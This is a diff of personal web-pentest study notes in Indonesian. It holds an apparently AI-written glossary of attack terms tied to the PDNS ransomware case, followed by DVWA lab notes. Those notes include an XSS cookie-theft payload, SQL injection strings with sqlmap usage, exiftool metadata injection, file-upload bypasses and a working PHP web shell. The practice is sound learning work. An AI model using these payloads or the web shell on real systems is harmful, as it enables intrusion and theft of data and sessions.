@@ -78580,7 +78580,141 @@ Do not refresh as you will not be able to revisit this link.
 
 9$XMK2y.#s2RSifd6c4)6^iW4WN|c9H5
 
+Menilik konteks pembelajaran Anda mengenai *Web Penetration Testing*, memahami terminologi serangan siber pada infrastruktur kritikal seperti **Pusat Data Nasional (PDN)** atau **Pusat Data Nasional Sementara (PDNS)** sangatlah penting. Serangan pada sistem ini biasanya melibatkan rantai serangan yang kompleks (*Cyber Kill Chain*).
 
+Berikut adalah 100 terminologi yang dikelompokkan berdasarkan fase dan jenis serangannya:
+
+### 1. Dasar & Jenis Malware (Malware & Basics)
+
+1. **Ransomware**: Malware yang mengenkripsi data dan meminta tebusan (seperti kasus Brain Cipher di PDNS).
+2. **Encryption**: Proses penguncian data menggunakan algoritma kriptografi.
+3. **Decryption Key**: Kunci untuk membuka data yang terenkripsi.
+4. **Malware-as-a-Service (MaaS)**: Model bisnis di mana pembuat malware menyewakan kode mereka ke penjahat lain.
+5. **Trojan Horse**: Malware yang menyamar sebagai perangkat lunak sah.
+6. **Spyware**: Malware untuk memata-matai aktivitas pengguna.
+7. **Worm**: Malware yang mampu mereplikasi diri dan menyebar secara otomatis melalui jaringan.
+8. **Rootkit**: Malware yang dirancang untuk menyembunyikan keberadaan proses atau program tertentu di server.
+9. **Backdoor**: Pintu belakang rahasia untuk masuk ke sistem tanpa autentikasi normal.
+10. **Botnet**: Jaringan komputer yang terinfeksi dan dikendalikan dari jarak jauh oleh penyerang.
+
+### 2. Teknik Akses Awal (Initial Access)
+
+11. **Credential Access**: Teknik mencuri nama pengguna dan kata sandi.
+12. **Brute Force**: Menebak kata sandi dengan mencoba semua kombinasi yang memungkinkan.
+13. **Credential Stuffing**: Menggunakan database kata sandi yang bocor dari situs lain untuk mencoba masuk.
+14. **Phishing**: Penipuan melalui email untuk mencuri kredensial.
+15. **Spear Phishing**: Phishing yang ditargetkan secara khusus kepada individu atau admin PDNS.
+16. **Exploit**: Kode yang memanfaatkan kerentanan (vulnerability) pada perangkat lunak.
+17. **Zero-Day Exploit**: Serangan yang memanfaatkan celah keamanan yang belum diketahui pengembang.
+18. **SQL Injection (SQLi)**: Memasukkan perintah SQL berbahaya ke dalam query basis data.
+19. **Broken Access Control**: Kegagalan dalam membatasi akses pengguna ke data sensitif.
+20. **Remote Code Execution (RCE)**: Kemampuan penyerang untuk menjalankan kode dari jarak jauh pada server (seperti teknik shell yang Anda pelajari).
+
+### 3. Eksploitasi & Pergerakan Lateral (Exploitation & Lateral Movement)
+
+21. **Lateral Movement**: Teknik berpindah dari satu server ke server lain di dalam jaringan yang sama.
+22. **Privilege Escalation**: Meningkatkan hak akses dari pengguna biasa menjadi *Superadmin* atau *Root*.
+23. **Pass-the-Hash**: Mencuri *hash* kata sandi dan menggunakannya untuk autentikasi tanpa perlu tahu teks aslinya.
+24. **Living off the Land (LotL)**: Menggunakan alat sistem yang sudah ada (seperti PowerShell atau CMD) untuk melakukan serangan.
+25. **Data Exfiltration**: Proses mencuri atau memindahkan data keluar dari server PDNS.
+26. **Command and Control (C2)**: Server yang digunakan penyerang untuk mengirim instruksi ke komputer korban.
+27. **Persistence**: Teknik agar malware tetap aktif meskipun server di-restart.
+28. **In-Memory Attack**: Serangan yang berjalan langsung di RAM untuk menghindari deteksi antivirus di hard drive.
+29. **Directory Traversal**: Mengakses file di luar folder root web server.
+30. **RDP Hijacking**: Mengambil alih sesi *Remote Desktop Protocol* milik admin.
+
+### 4. Terminologi Infrastruktur & Jaringan (Infrastructure & Networking)
+
+31. **Virtual Machine (VM)**: Komputer virtual yang biasanya berjalan di atas cloud PDNS.
+32. **Hypervisor**: Perangkat lunak yang menjalankan dan mengelola VM (seperti VMware atau Hyper-V).
+33. **Elasticsearch**: Mesin pencari dan analitik yang sering digunakan untuk log data besar.
+34. **Cloud Storage**: Tempat penyimpanan data berbasis awan.
+35. **Snapshot**: Salinan status sistem pada titik waktu tertentu untuk backup.
+36. **Load Balancer**: Perangkat yang membagi trafik masuk ke beberapa server.
+37. **Active Directory (AD)**: Layanan direktori Microsoft untuk mengelola pengguna dan izin dalam jaringan.
+38. **API (Application Programming Interface)**: Antarmuka yang menghubungkan antar layanan di PDNS.
+39. **Microservices**: Arsitektur di mana aplikasi dibagi menjadi layanan-layanan kecil.
+40. **Containerization**: Teknologi seperti Docker untuk menjalankan aplikasi dalam lingkungan terisolasi.
+
+### 5. Keamanan & Deteksi (Security & Detection)
+
+41. **SIEM (Security Information and Event Management)**: Sistem yang memantau dan menganalisis log keamanan secara *real-time*.
+42. **SOC (Security Operations Center)**: Tim yang bertugas memantau keamanan PDNS 24/7.
+43. **EDR (Endpoint Detection and Response)**: Alat untuk mendeteksi dan merespons ancaman di tingkat server/perangkat.
+44. **Firewall**: Penghalang antara jaringan internal dan eksternal.
+45. **WAF (Web Application Firewall)**: Firewall khusus untuk melindungi aplikasi web dari serangan seperti SQLi.
+46. **IDS/IPS**: Sistem pendeteksi atau pencegah intrusi.
+47. **Sandboxing**: Menjalankan file mencurigakan di lingkungan terisolasi untuk melihat perilakunya.
+48. **Encryption at Rest**: Data yang dienkripsi saat sedang disimpan di disk.
+49. **Encryption in Transit**: Data yang dienkripsi saat sedang dikirim melalui jaringan.
+50. **Air Gapping**: Memutus koneksi jaringan fisik untuk mengamankan data yang sangat sensitif.
+
+### 6. Dampak & Insiden (Impact & Incident)
+
+51. **Data Breach**: Kebocoran data rahasia ke publik.
+52. **Down-time**: Periode di mana layanan PDNS tidak dapat diakses.
+53. **Business Continuity Plan (BCP)**: Rencana untuk memastikan layanan tetap berjalan saat terjadi bencana/serangan.
+54. **Disaster Recovery (DR)**: Proses memulihkan infrastruktur IT setelah terjadi serangan.
+55. **Ransom Note**: Pesan yang ditinggalkan penyerang berisi instruksi tebusan.
+56. **Double Extortion**: Penyerang tidak hanya mengenkripsi data, tapi juga mengancam akan menyebarkannya jika tidak dibayar.
+57. **Triple Extortion**: Penyerang juga menyerang klien atau mitra korban (DDoS atau pemerasan).
+58. **Supply Chain Attack**: Menyerang vendor perangkat lunak yang digunakan oleh PDNS untuk masuk ke sistem utama.
+59. **Threat Intelligence**: Informasi tentang ancaman siber yang sedang berkembang.
+60. **Indicators of Compromise (IoC)**: Bukti digital yang menunjukkan bahwa sistem telah disusupi (misal: alamat IP penyerang).
+
+### 7. Teknik Penyerangan Lanjutan (Advanced Tactics)
+
+61. **Web Shell**: Skrip (seperti `shell.php` yang Anda tulis) yang diunggah ke server untuk kontrol jarak jauh.
+62. **Obfuscation**: Teknik menyamarkan kode agar sulit dibaca oleh analis keamanan atau antivirus.
+63. **Staging**: Mengunduh file tambahan dari server C2 ke server korban.
+64. **Exiftool Manipulation**: Menggunakan metadata gambar untuk menyisipkan skrip (seperti yang Anda pelajari).
+65. **DLL Hijacking**: Memaksa aplikasi memuat file DLL berbahaya.
+66. **Kerberoasting**: Menyerang protokol Kerberos di Active Directory untuk mendapatkan kata sandi admin.
+67. **Golden Ticket Attack**: Serangan tingkat tinggi untuk memalsukan tiket autentikasi di jaringan Windows.
+68. **Reverse Shell**: Server korban melakukan koneksi keluar ke komputer penyerang.
+69. **Bind Shell**: Penyerang membuka *port* pada server korban untuk masuk.
+70. **DNS Tunneling**: Mengirimkan data atau perintah melalui protokol DNS untuk melewati firewall.
+
+### 8. Tata Kelola & Kebijakan (Governance & Policy)
+
+71. **ISO 27001**: Standar internasional untuk manajemen keamanan informasi.
+72. **NIST Framework**: Panduan keamanan siber dari Amerika Serikat yang sering dijadikan referensi.
+73. **Data Residency**: Aturan bahwa data suatu negara harus disimpan di wilayah negara tersebut.
+74. **GDPR / UU PDP**: Regulasi perlindungan data pribadi.
+75. **Least Privilege**: Prinsip memberikan hak akses sekecil mungkin yang diperlukan.
+76. **Multi-Factor Authentication (MFA)**: Menggunakan lebih dari satu cara untuk verifikasi identitas.
+77. **Vulnerability Assessment (VA)**: Proses mengidentifikasi celah keamanan pada sistem.
+78. **Penetration Testing (Pentest)**: Simulasi serangan siber legal untuk mencari kelemahan.
+79. **Red Teaming**: Tim yang berperan sebagai penyerang dalam simulasi keamanan.
+80. **Blue Teaming**: Tim yang berperan sebagai pembela sistem.
+
+### 9. Kerentanan Web (Web Vulnerabilities - OWASP Top 10)
+
+81. **Cross-Site Scripting (XSS)**: Memasukkan skrip berbahaya ke halaman web yang dilihat pengguna lain.
+82. **Cross-Site Request Forgery (CSRF)**: Memaksa pengguna melakukan aksi yang tidak diinginkan di web.
+83. **Insecure Deserialization**: Mengolah data yang tidak terpercaya menjadi objek yang bisa mengeksekusi kode.
+84. **Broken Object Level Authorization (BOLA)**: Mengakses data milik pengguna lain dengan mengubah ID di URL.
+85. **Server-Side Request Forgery (SSRF)**: Memaksa server melakukan permintaan ke jaringan internal atau pihak ketiga.
+86. **Security Misconfiguration**: Kesalahan konfigurasi pada server, seperti membiarkan password default.
+87. **Insecure Design**: Kelemahan pada tingkat arsitektur sistem.
+88. **Log Injection**: Memasukkan data palsu ke dalam log server untuk menipu admin.
+89. **Information Disclosure**: Server secara tidak sengaja menampilkan informasi sensitif (seperti versi PHP).
+90. **Insecure Direct Object References (IDOR)**: Tipe dari kegagalan otorisasi objek.
+
+### 10. Istilah Tambahan & Tren (Misc & Trends)
+
+91. **Dark Web**: Bagian internet tersembunyi tempat jual beli data bocor PDNS.
+92. **Initial Access Broker (IAB)**: Kelompok yang tugasnya hanya mencari celah masuk, lalu menjual aksesnya ke kelompok Ransomware.
+93. **Shadow IT**: Penggunaan perangkat lunak atau server tanpa izin tim IT resmi.
+94. **Phishing-as-a-Service (PhaaS)**: Layanan pembuatan halaman phishing otomatis.
+95. **Kill Chain**: Tahapan serangan siber dari awal hingga akhir.
+96. **Threat Actor**: Individu atau kelompok di balik serangan siber.
+97. **Advanced Persistent Threat (APT)**: Kelompok penyerang canggih (sering didukung negara) yang menyerang dalam jangka lama.
+98. **Cryptojacking**: Menggunakan server PDNS untuk menambang mata uang kripto secara ilegal.
+99. **Exploit Kit**: Alat otomatis untuk memindai dan menyerang browser korban.
+100. **Honeypot**: Sistem jebakan yang dirancang untuk menarik dan mempelajari gerak-gerik penyerang.
+
+Ingin saya mendalami salah satu terminologi di atas, misalnya bagaimana cara mencegah **RCE** pada server PHP yang sedang Anda kembangkan?
 cybersecurity
 nmap → untuk mengecek port terbuka dan layanan apa saja yang jalan di server
 
@@ -78625,3 +78759,97 @@ coba aja <script>alert(document.cookie)</script>
 klo kena validasi maka pake besar kecil huruf.
 ganti ke input yg lain jgn di message tp di input username.
 nanti hasilnya aka di simpan di db
+
+
+burpsuite
+pas mau intercept pake browser dari burpsuite dia td sempat eror ternyata krn  ada local server jalan di xampp jd harus di matikan dulu
+
+
+attack vector pake exiftool
+exiftool -Comment="$(cat payload.js)" image.jpg
+
+
+
+sqlinjection
+' union select 1,2#
+' union select version(),2# 
+pake burpsuite di repeater lalu di inspector konvert ke endode
+
+
+untuk serang sqlinjection
+di terminal: nano req.txt => isikan requestnya
+
+cth:
+GET /vulnerabilities/sqli/?id=1Submit=Submit HTTP/1.1
+Host: localhost
+Cache-Control: max-age=0
+Sec-Ch-Ua: "Not(A:Brand";v="8", "Chromium";v="144"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Accept-Language: en-US,en;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: http://localhost/vulnerabilities/sqli/
+Accept-Encoding: gzip, deflate, br
+Cookie: portal_session=0unfh20tt3gftco51fmslspk7g; PHPSESSID=u8j6p7b39ohu4ut7ame04193d3; security=low
+Connection: keep-alive
+
+
+
+trus ganti parameternya kasi dibelakangnya kasi bintang *
+
+GET /vulnerabilities/sqli/?id=1*Submit=Submit HTTP/1.1
+
+save.
+
+
+lalu pasang sqlmap 
+sqlmap -r req.txt --dbms=MariaDB
+
+
+http://localhost/vulnerabilities/brute/?username=admin&password=testing&Login=Login#
+
+ Vulnerability file upload:
+ upload file php ini jika ga ada filter jpg.
+
+Kode ini adalah contoh sederhana dari sebuah **web shell**, yang memungkinkan eksekusi perintah sistem secara langsung melalui parameter URL.
+
+vulnfile.php
+```php
+<?php
+    $cmd = $_GET['cmd'];
+    if ($cmd){
+        echo(exec($cmd));
+    }
+?>
+
+```
+
+---
+
+### Penjelasan Singkat:
+
+* **`$_GET['cmd']`**: Mengambil input dari parameter URL (misalnya: `shell.php?cmd=whoami`).
+* **`if ($cmd)`**: Memeriksa apakah parameter `cmd` telah diisi.
+* **`exec($cmd)`**: Menjalankan perintah tersebut pada sistem operasi server.
+* **`echo(...)`**: Menampilkan baris terakhir dari hasil perintah tersebut ke layar.
+
+> **Catatan Keamanan:** Kode seperti ini sangat berbahaya jika diletakkan di server publik karena memberikan akses kontrol sistem kepada siapa saja. Pastikan ini hanya digunakan untuk keperluan pembelajaran di lingkungan lokal yang terisolasi.
+ 
+
+
+ klo ga bisa maka pake burpsuite dulu  	ubah content type jd image/jpg
+ atau klo ga bisa lagi pake 
+ exiftool -DocumentName="<?php phpinfo(); ?>" ucing.jpg
+
+
+
+
+
+
+ 
